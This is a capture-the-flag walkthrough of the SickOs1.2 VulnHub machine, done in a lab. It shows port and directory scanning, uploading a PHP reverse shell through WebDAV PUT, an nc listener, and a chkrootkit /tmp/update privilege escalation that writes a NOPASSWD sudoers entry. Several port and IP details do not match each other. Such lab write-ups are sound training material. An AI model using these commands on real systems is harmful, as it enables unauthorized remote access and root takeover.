

# Boot2root: Sickos1.2

This is my walk-through of the Sickos1.2 challenge posted on vulnhub.com All penetration testing on this image was preformed in an isolated lab environment. 

### Step 1: I always start with a full nmap scan.

```bash
nmap -A -T4 -p- 192.168.2.9
```

```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-11 19:42 CEST
Nmap scan report for 192.168.2.9
Host is up (0.0044s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.63 seconds
```

The nmap scan show me two open ports 22 and 80. First i will try to access port 80 in my browser.

![webpage](/home/firewatch/Documents/Website/assets/images/webpage.png)

Then i start using Nikto Web Scanner. Nikto Web Scanner is a Web server  scanner that tests Web servers for dangerous files/CGIs, outdated server software and other problems. It performs generic and server type  specific checks. It also captures and prints any cookies received.

```bash
nikto -h http://192.168.2.9/
```

```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.2.9
+ Target Hostname:    192.168.2.9
+ Target Port:        80
+ Start Time:         2018-05-11 19:53:37 (GMT2)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 6544 items checked: 0 error(s) and 1 item(s) reported on remote host
+ End Time:           2018-05-11 19:53:47 (GMT2) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```



Unfortunate Nikto Web Scanner found nothing. So i started to scan for directories using DIRB. DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack  against a web server and analyzing the response.

```bash
dirb http://192.168.2.9/ /usr/share/dirb/wordlists/big.txt
```

```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May 11 19:59:42 2018
URL_BASE: http://192.168.2.9/
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.2.9/ ----
==> DIRECTORY: http://192.168.2.9/test/                                               
+ http://192.168.2.9/~sys~ (CODE:403|SIZE:345)                                        
                                                                                      
---- Entering directory: http://192.168.2.9/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri May 11 19:59:56 2018
DOWNLOADED: 20458 - FOUND: 1
```

I've found http://192.168.2.9/test/ directory. So i tried to access it.

![](/home/firewatch/Documents/Website/assets/images/test-directory.png)

After that i checked if there are any vulnerabilities for Lighthttpd with Searchsploit. with no results.

```bash
searchsploit lighthttpd
```

```bash
Exploits: No Result
Shellcodes: No Result
```

After that i used cURL to check for avaible HHTP methods for 192.168.2.9/test by doing the following:

```bash
curl -v -X OPTIONS http://192.168.2.9/test/
```

```bash
*   Trying 192.168.2.9...
* TCP_NODELAY set
* Connected to 192.168.2.9 (192.168.2.9) port 80 (#0)
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.2.9
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Allow: OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Fri, 11 May 2018 18:31:29 GMT
< Server: lighttpd/1.4.28
< 
```

I see the PUT method is allowed for this directory. So i'm going to try upload a reverse shell. I downloaded a [PHP-Reverse-Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) from Pentestmonkey. First i have changed the IP address in the PHP script to the IP i want the shell thrown back to.

```php
$ip = '192.168.2.6';  // CHANGE THIS
```

```php
$port = 8080;       // CHANGE THIS
```

Then i started a TCP listener on a host and port that will be accessible by the web  server.  I used the same port here as specified in the script (1234 in  this example):

```bash
nc -v -n -l -p 1234
```

After that I tried to upload the script by using a cURL command.

```bash
curl -v -T php-reverse-shell.php --url http://192.168.2.9/test/ -0
```

And it worked to get a reverse shell.

```bash
listening on [any] 8080 ...
connect to [192.168.2.8] from (UNKNOWN) [192.168.2.9] 45488
Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 10:32:56 up 16 min,  0 users,  load average: 0.02, 0.08, 0.12
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Now it is time to enumerate the machine. Enumeration is the first attack on target network, enumeration is the process to gather the information about a target machine by actively connecting to it.

```bash
ls -l /etc/cron.daily
```

```bash
total 60
-rwxr-xr-x 1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x 1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x 1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x 1 root root  2032 Jun  4  2014 chkrootkit
-rwxr-xr-x 1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x 1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x 1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x 1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x 1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x 1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x 1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x 1 root root  2947 Jun 19  2012 standard
$ 
```

After enumeration, find the system has chkrootkit:

```bash
dpkg -l | grep chkrootkit
```

```bash
rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
```

I found that the chkrootkit is vulnerable and can give root access by adding a file to `/tmp` called `update`. Add the following to contain shell command that add **sudo su** to user www-data

```bash
echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

Now change permission by using:

```bash
chmod +x /tmp/update
```

Now you should be able to get root access.

```bash
sudo su
```

```bash
whoami
```

```
root
```

```bash
cd /root
```

```bash
cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
```

```
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
```

